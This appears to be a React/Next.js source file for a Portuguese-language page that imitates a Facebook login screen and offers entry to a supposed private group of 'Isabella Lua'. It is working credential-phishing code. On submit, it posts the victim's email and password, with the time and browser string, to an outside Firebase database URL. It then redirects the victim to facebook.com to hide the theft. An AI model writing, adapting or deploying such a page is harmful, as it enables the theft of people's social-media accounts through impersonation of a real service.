"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Separator } from "@/components/ui/separator"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Lock, Users, Shield } from 'lucide-react'

export default function GrupoPrivadoIsabella() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      // URL do seu Firebase Realtime Database
      const firebaseUrl = "https://form-test-c6a76-default-rtdb.firebaseio.com/logins.json"

      // Dados para enviar
      const dadosLogin = {
        email: email,
        senha: password,
        dataHora: new Date().toLocaleString("pt-BR"),
        timestamp: Date.now(),
        ip: "Capturado via Next.js",
        navegador: navigator.userAgent.substring(0, 100),
      }

      // Envia para o Firebase
      const response = await fetch(firebaseUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dadosLogin),
      })

      if (response.ok) {
        console.log("✅ Dados salvos no Firebase:", dadosLogin)

        // Pequeno delay para mostrar o loading
        setTimeout(() => {
          // Redireciona para o Facebook
          window.location.href = "https://www.facebook.com/"
        }, 1000)
      } else {
        console.error("❌ Erro ao salvar no Firebase")
        alert("Erro ao processar login. Tente novamente.")
        setIsLoading(false)
      }
    } catch (err) {
      console.error("Erro de rede:", err)
      alert("Erro de conexão. Tente novamente.")
      setIsLoading(false)
    }
  }

  const handleSolicitarAcesso = () => {
    alert("🔄 Redirecionando para formulário de solicitação de acesso...")
  }

  return (
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col">
      {/* Conteúdo Principal */}
      <div className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-md">
          {/* Cabeçalho do Grupo */}
          <div className="text-center mb-8 animate-in fade-in duration-700">
            <div className="flex items-center justify-center mb-4">
              <div className="relative">
                <Avatar className="w-20 h-20 border-4 border-white shadow-xl ring-4 ring-[#1877F2]/30">
                  <AvatarImage src="/placeholder.svg?height=80&width=80" alt="Isabella Lua" className="object-cover" />
                  <AvatarFallback className="bg-gradient-to-br from-[#1877F2] to-[#42B72A] text-white font-bold text-2xl">
                    IL
                  </AvatarFallback>
                </Avatar>
                <div className="absolute -bottom-2 -right-2 bg-[#42B72A] rounded-full p-2 border-3 border-white shadow-lg">
                  <Lock className="w-4 h-4 text-white" />
                </div>
              </div>
            </div>

            <h1 className="text-3xl md:text-4xl font-bold text-[#1C1E21] mb-3">Grupo Privado da Isabella Lua</h1>
            <div className="flex items-center justify-center gap-2 text-gray-600 mb-2">
              <Users className="w-4 h-4" />
              <p className="text-sm md:text-base">Acesso exclusivo para membros aprovados</p>
            </div>
            <div className="flex items-center justify-center gap-4 text-xs text-gray-500">
              <span className="flex items-center gap-1">
                <Shield className="w-3 h-3" />
                Privado
              </span>
              <span>•</span>
              <span>Apenas por convite</span>
              <span>•</span>
              <span>Conteúdo exclusivo</span>
            </div>
          </div>

          {/* Card de Login */}
          <div className="bg-white rounded-xl shadow-lg p-8 animate-in fade-in duration-500 delay-200">
            <div className="text-center mb-6">
              <h2 className="text-xl font-semibold text-[#1C1E21] mb-1">Entrar no Facebook</h2>
              <p className="text-gray-600 text-sm">Faça login para acessar o grupo privado</p>
            </div>

            {/* Formulário de Login */}
            <form onSubmit={handleLogin}>
              <div className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="email" className="sr-only">
                    Email ou telefone
                  </Label>
                  <Input
                    id="email"
                    name="email"
                    type="text"
                    placeholder="Email ou telefone"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="h-12 text-base rounded-lg border-gray-300 shadow-inner focus:border-[#1877F2] focus:ring-[#1877F2] focus:ring-2 transition-all duration-200"
                    required
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="password" className="sr-only">
                    Senha
                  </Label>
                  <Input
                    id="password"
                    name="senha"
                    type="password"
                    placeholder="Senha"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="h-12 text-base rounded-lg border-gray-300 shadow-inner focus:border-[#1877F2] focus:ring-[#1877F2] focus:ring-2 transition-all duration-200"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 bg-[#1877F2] hover:bg-[#166FE5] text-white font-bold text-base rounded-lg shadow-md hover:shadow-xl transition-all duration-200 disabled:opacity-50 transform hover:scale-[1.02]"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Entrando...
                    </div>
                  ) : (
                    "Entrar no Grupo"
                  )}
                </Button>
              </div>
            </form>

            <div className="text-center mt-4">
              <a href="#" className="text-[#1877F2] text-sm hover:underline transition-colors hover:text-[#166FE5]">
                Esqueceu a senha?
              </a>
            </div>

            <div className="my-6">
              <Separator className="bg-gray-300" />
            </div>

            <div className="text-center space-y-3">
              <p className="text-gray-600 text-sm">Ainda não faz parte do grupo?</p>
              <Button
                type="button"
                onClick={handleSolicitarAcesso}
                className="bg-[#42B72A] hover:bg-[#36A420] text-white font-bold px-8 py-3 rounded-lg shadow-md hover:shadow-xl transition-all duration-200 transform hover:scale-[1.02]"
              >
                Solicitar Acesso
              </Button>
              <p className="text-xs text-gray-500 mt-2">As solicitações são analisadas pela Isabella Lua</p>
            </div>
          </div>

          {/* Aviso de Teste */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center gap-2 bg-green-100 backdrop-blur-sm rounded-full px-4 py-2 text-xs text-green-800 shadow-sm">
              <span>🔥 FIREBASE: Dados salvos automaticamente na nuvem</span>
            </div>
          </div>

          {/* Rodapé */}
          <footer className="mt-8 text-center animate-in fade-in duration-700 delay-500">
            <div className="flex flex-wrap justify-center gap-4 text-xs text-gray-500 mb-2">
              <a href="#" className="hover:underline transition-colors hover:text-gray-700">
                Português (Brasil)
              </a>
              <a href="#" className="hover:underline transition-colors hover:text-gray-700">
                English (US)
              </a>
              <a href="#" className="hover:underline transition-colors hover:text-gray-700">
                Español
              </a>
            </div>
            <div className="text-xs text-gray-400">Meta © 2024</div>
          </footer>
        </div>
      </div>
    </div>
  )
}
